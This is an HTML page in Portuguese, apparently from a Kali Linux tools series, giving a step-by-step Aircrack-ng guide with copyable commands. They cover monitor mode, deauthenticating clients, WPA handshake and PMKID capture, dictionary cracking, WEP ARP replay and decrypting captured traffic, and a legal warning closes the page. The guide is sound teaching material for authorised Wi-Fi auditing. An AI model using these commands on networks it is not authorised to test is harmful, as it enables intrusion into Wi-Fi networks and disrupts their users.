@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aircrack-ng — Guia Detalhado</title>
+<style>
+  :root {
+    --bg: #0f1115; --card: #171a21; --border: #262b36;
+    --text: #e6e8eb; --muted: #8b93a1; --accent: #00d1b2;
+    --accent2: #4f8cff; --code-bg: #0b0d11; --star: #f5c518;
+  }
+  [data-theme="light"] {
+    --bg: #f5f6f8; --card: #ffffff; --border: #e1e4e8;
+    --text: #1a1d23; --muted: #5f6672; --accent: #00897b;
+    --accent2: #2962ff; --code-bg: #f0f2f5;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg); color: var(--text);
+    line-height: 1.6; padding: 2rem 1rem;
+    transition: background .3s, color .3s;
+  }
+  .container { max-width: 960px; margin: 0 auto; }
+
+  .top-actions { display: flex; justify-content: flex-end; gap: .5rem; margin-bottom: 1rem; }
+  .icon-btn {
+    background: var(--card); border: 1px solid var(--border);
+    color: var(--text); width: 40px; height: 40px;
+    border-radius: 8px; cursor: pointer; font-size: 1.1rem;
+    display: flex; align-items: center; justify-content: center;
+    transition: border-color .2s, transform .1s;
+  }
+  .icon-btn:hover { border-color: var(--accent); transform: translateY(-1px); }
+
+  .back-link {
+    display: inline-flex; align-items: center; gap: .35rem;
+    color: var(--accent2); text-decoration: none;
+    font-size: .9rem; margin-bottom: 1.5rem;
+  }
+  .back-link:hover { text-decoration: underline; }
+
+  header { border-bottom: 1px solid var(--border); padding-bottom: 1.5rem; margin-bottom: 2rem; }
+  h1 {
+    font-size: 2.2rem;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text; margin-bottom: .5rem;
+  }
+  .subtitle { color: var(--muted); font-size: 1.05rem; }
+  .meta { margin-top: .75rem; display: flex; gap: 1rem; flex-wrap: wrap; font-size: .85rem; }
+  .meta span { color: var(--muted); }
+  .meta a { color: var(--accent2); text-decoration: none; }
+  .meta a:hover { text-decoration: underline; }
+
+  h2 {
+    font-size: 1.35rem; margin: 2.5rem 0 1rem;
+    padding-bottom: .4rem; border-bottom: 1px solid var(--border);
+    color: var(--accent);
+  }
+  h3 { font-size: 1.05rem; margin: 1.5rem 0 .5rem; color: var(--text); }
+  p { margin-bottom: 1rem; color: var(--muted); font-size: .95rem; }
+  ul, ol { margin: 0 0 1rem 1.5rem; color: var(--muted); font-size: .95rem; }
+  li { margin-bottom: .35rem; }
+  strong { color: var(--text); }
+
+  .card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 1.25rem; margin-bottom: 1rem;
+  }
+
+  .code {
+    background: var(--code-bg); border: 1px solid var(--border);
+    border-radius: 6px; padding: .65rem .85rem;
+    font-family: "SF Mono", Consolas, Monaco, monospace;
+    font-size: .82rem; color: var(--accent);
+    overflow-x: auto; white-space: pre-wrap;
+    margin-bottom: .85rem; cursor: pointer; position: relative;
+  }
+  .code:hover::after {
+    content: "copiar"; position: absolute; right: .6rem; top: .5rem;
+    font-size: .65rem; color: var(--muted); background: var(--code-bg);
+    padding: 0 .3rem;
+  }
+  .code.copied::after { content: "✓ copiado"; color: var(--accent); }
+
+  .tag {
+    display: inline-block; font-size: .7rem; text-transform: uppercase;
+    letter-spacing: .05em; padding: .2rem .55rem;
+    border-radius: 999px; margin-bottom: .75rem;
+  }
+  .tag-setup { background: rgba(0,209,178,.15); color: var(--accent); }
+  .tag-scan { background: rgba(79,140,255,.15); color: var(--accent2); }
+  .tag-attack { background: rgba(255,80,80,.15); color: #ff6b6b; }
+  .tag-crack { background: rgba(245,197,24,.15); color: var(--star); }
+
+  .table {
+    width: 100%; border-collapse: collapse; font-size: .88rem; margin-bottom: 1rem;
+  }
+  .table th, .table td {
+    text-align: left; padding: .5rem .75rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .table th { color: var(--accent); font-weight: 600; }
+  .table td { color: var(--muted); }
+  .table code { color: var(--accent); background: var(--code-bg); padding: .1rem .3rem; border-radius: 3px; }
+
+  .cheat-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: .75rem; margin-bottom: 1rem;
+  }
+  .cheat-item {
+    background: var(--code-bg); border: 1px solid var(--border);
+    border-radius: 8px; padding: .75rem; font-size: .82rem;
+  }
+  .cheat-item .cmd {
+    color: var(--accent); font-family: monospace; display: block; margin-bottom: .3rem;
+  }
+  .cheat-item .desc { color: var(--muted); font-size: .78rem; }
+
+  .warning {
+    background: rgba(255,80,80,.08); border-left: 3px solid #ff5050;
+    padding: .85rem 1rem; border-radius: 0 8px 8px 0;
+    margin-bottom: 1rem; font-size: .88rem; color: var(--muted);
+  }
+  .warning strong { color: #ff6b6b; }
+
+  .highlight {
+    background: rgba(0,209,178,.08); border-left: 3px solid var(--accent);
+    padding: .85rem 1rem; border-radius: 0 8px 8px 0;
+    margin-bottom: 1rem; font-size: .88rem; color: var(--muted);
+  }
+  .highlight strong { color: var(--accent); }
+
+  footer {
+    margin-top: 3rem; text-align: center; font-size: .8rem;
+    color: var(--muted); border-top: 1px solid var(--border); padding-top: 1.5rem;
+  }
+
+  @media print {
+    body { background: #fff; color: #000; padding: 0; }
+    .top-actions, .back-link, .code:hover::after { display: none !important; }
+    h1 { -webkit-text-fill-color: #000; color: #000; }
+    .code { background: #f5f5f5; color: #333; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="top-actions">
+  <button class="icon-btn" id="themeBtn" title="Alternar tema">🌙</button>
+  <button class="icon-btn" id="printBtn" title="Imprimir / PDF">🖨️</button>
+</div>
+
+<a class="back-link" href="kali-tools.html">← Voltar às 15 ferramentas</a>
+
+<header>
+  <h1>Aircrack-ng</h1>
+  <p class="subtitle">Suíte completa de auditoria Wi-Fi — captura, injeção, ataque e cracking WEP/WPA/WPA2</p>
+  <div class="meta">
+    <span>🔗 <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener">Site oficial</a></span>
+    <span>📖 <a href="https://www.aircrack-ng.org/doku.php?id=main" target="_blank" rel="noopener">Documentação</a></span>
+    <span>📦 <a href="https://github.com/aircrack-ng/aircrack-ng" target="_blank" rel="noopener">GitHub</a></span>
+  </div>
+</header>
+
+<h2>O que é o Aircrack-ng?</h2>
+<p>
+  O Aircrack-ng é uma <strong>suíte completa de ferramentas para avaliar a segurança de redes Wi-Fi</strong>.
+  Foi iniciado em fevereiro de 2006 como a "próxima geração" do aircrack original, com muitas funcionalidades
+  novas. Foca-se em quatro áreas principais : <strong>Monitorização</strong> (captura de pacotes),
+  <strong>Ataque</strong> (replay, deautenticação, access points falsos), <strong>Teste</strong> (verificação
+  de capacidades da placa/driver) e <strong>Cracking</strong> (WEP e WPA PSK) .
+</p>
+<p>
+  Todas as ferramentas são de linha de comandos, o que permite automação pesada via scripting. Funciona
+  primariamente em Linux, mas também em Windows, macOS, FreeBSD, OpenBSD, NetBSD, Solaris e até eComStation 2 .
+  Uma placa Wi-Fi que suporte <strong>monitor mode</strong> e <strong>injeção de pacotes</strong> é essencial —
+  a qualidade do adaptador importa mais que a sintaxe dos comandos .
+</p>
+
+<h2>Componentes da Suíte</h2>
+<p>O Aircrack-ng é um conjunto de binários separados, cada um com uma função específica :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Ferramenta</th><th>Função</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>airmon-ng</strong></td>
+      <td>Gerir interfaces em monitor mode (ativar, desativar, verificar) .</td>
+    </tr>
+    <tr>
+      <td><strong>airodump-ng</strong></td>
+      <td>Captura de pacotes e descoberta de APs e clientes .</td>
+    </tr>
+    <tr>
+      <td><strong>aireplay-ng</strong></td>
+      <td>Injeção de pacotes, deautenticação, replay de ARP, fake auth .</td>
+    </tr>
+    <tr>
+      <td><strong>aircrack-ng</strong></td>
+      <td>Motor de cracking WEP e WPA/WPA2 PSK .</td>
+    </tr>
+    <tr>
+      <td><strong>airdecap-ng</strong></td>
+      <td>Desencriptação de tráfego capturado após obter a chave .</td>
+    </tr>
+    <tr>
+      <td><strong>airgraph-ng</strong></td>
+      <td>Visualização de topologia de rede .</td>
+    </tr>
+    <tr>
+      <td><strong>airolib-ng</strong></td>
+      <td>Base de dados de PMKs pré-calculados para acelerar cracking .</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Fluxo de Trabalho — WPA/WPA2</h2>
+<p>O ataque a WPA/WPA2 segue uma sequência bem definida. Cada passo depende do anterior :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Passo</th><th>Ferramenta</th><th>Objetivo</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>1. Monitor Mode</strong></td>
+      <td>airmon-ng</td>
+      <td>Colocar a placa em monitor mode para capturar todo o tráfego .</td>
+    </tr>
+    <tr>
+      <td><strong>2. Descoberta</strong></td>
+      <td>airodump-ng</td>
+      <td>Listar APs: BSSID, canal, ESSID, encriptação .</td>
+    </tr>
+    <tr>
+      <td><strong>3. Captura Direcionada</strong></td>
+      <td>airodump-ng</td>
+      <td>Bloquear no AP alvo e canal, guardar captura .</td>
+    </tr>
+    <tr>
+      <td><strong>4. Deauth</strong></td>
+      <td>aireplay-ng</td>
+      <td>Forçar cliente a reconectar para capturar o handshake .</td>
+    </tr>
+    <tr>
+      <td><strong>5. Verificação</strong></td>
+      <td>airodump-ng</td>
+      <td>Confirmar "WPA handshake" no canto superior direito .</td>
+    </tr>
+    <tr>
+      <td><strong>6. Cracking</strong></td>
+      <td>aircrack-ng</td>
+      <td>Dicionário ou máscara contra o handshake capturado .</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Exemplos de Uso — do Setup ao Cracking</h2>
+
+<h3>1. Verificar interfaces e capacidades</h3>
+<span class="tag tag-setup">Setup</span>
+<div class="code" data-cmd="airmon-ng">airmon-ng</div>
+<p>Lista as interfaces wireless e os seus PHY numbers. Verifica se a placa suporta monitor mode .</p>
+
+<h3>2. Matar processos que interferem</h3>
+<span class="tag tag-setup">Setup</span>
+<div class="code" data-cmd="sudo airmon-ng check kill">sudo airmon-ng check kill</div>
+<p>Mata NetworkManager e wpa_supplicant que podem bloquear a mudança para monitor mode. Essencial antes de ativar .</p>
+
+<h3>3. Ativar monitor mode</h3>
+<span class="tag tag-setup">Setup</span>
+<div class="code" data-cmd="sudo airmon-ng start wlan0">sudo airmon-ng start wlan0</div>
+<p>Ativa monitor mode. A interface normalmente passa a chamar-se <code>wlan0mon</code> .</p>
+
+<h3>4. Verificar monitor mode</h3>
+<span class="tag tag-setup">Setup</span>
+<div class="code" data-cmd="iwconfig wlan0mon">iwconfig wlan0mon</div>
+<p>Confirma que aparece <code>Mode:Monitor</code> .</p>
+
+<h3>5. Scan passivo de redes</h3>
+<span class="tag tag-scan">Descoberta</span>
+<div class="code" data-cmd="sudo airodump-ng wlan0mon">sudo airodump-ng wlan0mon</div>
+<p>Lista APs e clientes. Nota: BSSID (MAC do AP), CH (canal), ESSID (nome), ENC (encriptação) .</p>
+
+<h3>6. Scan apenas 5 GHz</h3>
+<span class="tag tag-scan">Descoberta</span>
+<div class="code" data-cmd="sudo airodump-ng --band a wlan0mon">sudo airodump-ng --band a wlan0mon</div>
+<p>Scan no 5 GHz (padrão é 2.4 GHz). Requer placa que suporte 5 GHz .</p>
+
+<h3>7. Captura direcionada ao alvo</h3>
+<span class="tag tag-scan">Descoberta</span>
+<div class="code" data-cmd="sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon">sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon</div>
+<p>Bloqueia no AP e canal específicos. Guarda em <code>capture-01.cap</code>. Aguarda "WPA handshake" no topo .</p>
+
+<h3>8. Deauth — forçar handshake</h3>
+<span class="tag tag-attack">Ataque</span>
+<div class="code" data-cmd="sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon">sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon</div>
+<p>Envia 5 pacotes de deauth ao cliente específico. O cliente reconecta e gera o 4-way handshake .</p>
+<p><strong>Deauth broadcast</strong> (todos os clientes, omitir <code>-c</code>): <code>aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</code> .</p>
+
+<h3>9. Verificar captura</h3>
+<span class="tag tag-crack">Verificação</span>
+<div class="code" data-cmd="aircrack-ng capture-01.cap">aircrack-ng capture-01.cap</div>
+<p>Verifica se o ficheiro contém um handshake válido antes de tentar cracking .</p>
+
+<h3>10. Cracking com dicionário</h3>
+<span class="tag tag-crack">Cracking</span>
+<div class="code" data-cmd="aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap">aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap</div>
+<p>Testa cada palavra do <code>rockyou.txt</code> contra o handshake .</p>
+
+<h3>11. Cracking com ESSID em vez de BSSID</h3>
+<span class="tag tag-crack">Cracking</span>
+<div class="code" data-cmd="aircrack-ng -w wordlist.txt -e &quot;NetworkName&quot; capture-01.cap">aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap</div>
+<p>Seleciona a rede pelo nome. Útil quando o ficheiro tem várias redes .</p>
+
+<h3>12. Cracking com múltiplos CPU cores</h3>
+<span class="tag tag-crack">Cracking</span>
+<div class="code" data-cmd="aircrack-ng -w wordlist.txt capture-01.cap -p 4">aircrack-ng -w wordlist.txt capture-01.cap -p 4</div>
+<p><code>-p 4</code> usa 4 threads CPU. Acelera o cracking em máquinas multi-core .</p>
+
+<h3>13. Cracking com airolib-ng (PMKs pré-calculados)</h3>
+<span class="tag tag-crack">Cracking</span>
+<div class="code" data-cmd="airolib-ng target.sqlite --import essid essid.txt && airolib-ng target.sqlite --import passwd rockyou.txt && airolib-ng target.sqlite --batch && aircrack-ng -r target.sqlite capture-01.cap">airolib-ng target.sqlite --import essid essid.txt && airolib-ng target.sqlite --import passwd rockyou.txt && airolib-ng target.sqlite --batch && aircrack-ng -r target.sqlite capture-01.cap</div>
+<p>Pré-calcula PMKs para reutilização em múltiplos handshakes do mesmo ESSID .</p>
+
+<h3>14. WEP — captura e ataque</h3>
+<span class="tag tag-attack">WEP</span>
+<div class="code" data-cmd="sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon">sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon</div>
+<p>Captura para WEP. Depois, em outro terminal, injeção ARP:</p>
+<div class="code" data-cmd="sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon">sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon</div>
+<p>Replay de ARP para forçar geração de IVs. O <code>airodump-ng</code> mostra a contagem de IVs a subir .</p>
+<div class="code" data-cmd="aircrack-ng wep-01.cap">aircrack-ng wep-01.cap</div>
+<p>Quando há IVs suficientes, o Aircrack-ng recupera a chave automaticamente (PTW primeiro, depois FMS/KoreK) .</p>
+
+<h3>15. Testar capacidade de injeção</h3>
+<span class="tag tag-attack">Ataque</span>
+<div class="code" data-cmd="sudo aireplay-ng -9 wlan0mon">sudo aireplay-ng -9 wlan0mon</div>
+<p>Valida se a placa consegue injetar pacotes. Essencial antes de depender de ataques ativos .</p>
+
+<h3>16. PMKID attack (sem clientes)</h3>
+<span class="tag tag-attack">Ataque</span>
+<div class="code" data-cmd="sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1">sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1</div>
+<div class="code" data-cmd="hcxpcapngtool pmkid.pcapng -o hashes.22000">hcxpcapngtool pmkid.pcapng -o hashes.22000</div>
+<div class="code" data-cmd="hashcat -m 22000 hashes.22000 rockyou.txt">hashcat -m 22000 hashes.22000 rockyou.txt</div>
+<p>Não requer cliente conectado. Captura PMKID do AP e passa para Hashcat (modo 22000) .</p>
+
+<h3>17. Desencriptar tráfego capturado</h3>
+<span class="tag tag-crack">Pós-crack</span>
+<div class="code" data-cmd="airdecap-ng -b AA:BB:CC:DD:EE:FF -e TargetSSID -p recovered-pass capture-01.cap">airdecap-ng -b AA:BB:CC:DD:EE:FF -e TargetSSID -p recovered-pass capture-01.cap</div>
+<p>Desencripta o tráfego capturado com a password recuperada, permitindo análise no Wireshark .</p>
+
+<h3>18. Desativar monitor mode e restaurar rede</h3>
+<span class="tag tag-setup">Cleanup</span>
+<div class="code" data-cmd="sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager">sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager</div>
+<p>Termina a sessão de auditoria e restaura a gestão normal de rede .</p>
+
+<h2>Campos do Airodump-ng</h2>
+<p>Interpretar corretamente o output do <code>airodump-ng</code> é essencial :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Campo</th><th>Significado</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>BSSID</code></td><td>MAC do Access Point</td></tr>
+    <tr><td><code>PWR</code></td><td>Força do sinal (maior = melhor)</td></tr>
+    <tr><td><code>CH</code></td><td>Canal do AP</td></tr>
+    <tr><td><code>ENC</code></td><td>Encriptação (WEP, WPA, WPA2, WPA3, Open)</td></tr>
+    <tr><td><code>AUTH</code></td><td>Autenticação (PSK, MGT, OPN)</td></tr>
+    <tr><td><code>ESSID</code></td><td>Nome da rede</td></tr>
+    <tr><td><code>Data</code></td><td>Nº de pacotes de dados capturados</td></tr>
+    <tr><td><code>Probes</code></td><td>Redes que o cliente procura (útil para Evil Twin) </td></tr>
+  </tbody>
+</table>
+
+<h2>Cheat Sheet rápido</h2>
+<div class="cheat-grid">
+  <div class="cheat-item">
+    <span class="cmd">airmon-ng start wlan0</span>
+    <span class="desc">Ativar monitor mode</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">airodump-ng wlan0mon</span>
+    <span class="desc">Scan de redes</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">--bssid XX -c 6 -w cap</span>
+    <span class="desc">Captura direcionada</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">aireplay-ng --deauth 5</span>
+    <span class="desc">Forçar handshake</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">aircrack-ng -w rockyou.txt</span>
+    <span class="desc">Cracking com dicionário</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">aireplay-ng -3 -b BSSID</span>
+    <span class="desc">ARP replay (WEP)</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">aireplay-ng -9 wlan0mon</span>
+    <span class="desc">Testar injeção</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">airdecap-ng -p pass</span>
+    <span class="desc">Desencriptar tráfego</span>
+  </div>
+</div>
+
+<div class="highlight">
+  <strong>💡 Dica:</strong> A qualidade do adaptador Wi-Fi importa mais que qualquer comando. Verifica sempre
+  <code>aireplay-ng -9 wlan0mon</code> para confirmar injeção antes de depender de ataques ativos. Se a injeção
+  falhar, verifica o channel lock, a precisão do BSSID/ESSID e se o AP está a rejeitar estações não associadas .
+  Para automação rápida em múltiplos APs, considera o <strong>wifite</strong>; para recon passivo multi-sensor,
+  o <strong>kismet</strong> é frequentemente melhor .
+</div>
+
+<div class="warning">
+  <strong>⚠️ Aviso legal:</strong> Capturar, injetar ou crackear uma rede wireless que não possuis ou para
+  a qual não tens autorização escrita é <strong>ilegal na maioria das jurisdições</strong> . Os ataques de
+  deauth <strong>interrompem utilizadores</strong> — usa apenas em redes próprias ou laboratórios controlados.
+  Usa estas ferramentas exclusivamente contra o teu próprio equipamento ou sob um scope de engajamento explícito .
+</div>
+
+<footer>
+  Guia Aircrack-ng — parte da série "Top 15 Ferramentas Kali Linux".
+</footer>
+
+</div>
+
+<script>
+// Tema
+const themeBtn = document.getElementById("themeBtn");
+const savedTheme = localStorage.getItem("aircrack-theme") || "dark";
+document.documentElement.setAttribute("data-theme", savedTheme);
+themeBtn.textContent = savedTheme === "dark" ? "🌙" : "☀️";
+
+themeBtn.addEventListener("click", () => {
+  const current = document.documentElement.getAttribute("data-theme");
+  const next = current === "dark" ? "light" : "dark";
+  document.documentElement.setAttribute("data-theme", next);
+  localStorage.setItem("aircrack-theme", next);
+  themeBtn.textContent = next === "dark" ? "🌙" : "☀️";
+});
+
+// Imprimir
+document.getElementById("printBtn").addEventListener("click", () => window.print());
+
+// Copiar comandos
+document.querySelectorAll(".code").forEach(el => {
+  el.addEventListener("click", () => {
+    navigator.clipboard.writeText(el.dataset.cmd).then(() => {
+      el.classList.add("copied");
+      setTimeout(() => el.classList.remove("copied"), 1200);
+    });
+  });
+});
+</script>
+
+</body>
+</html>
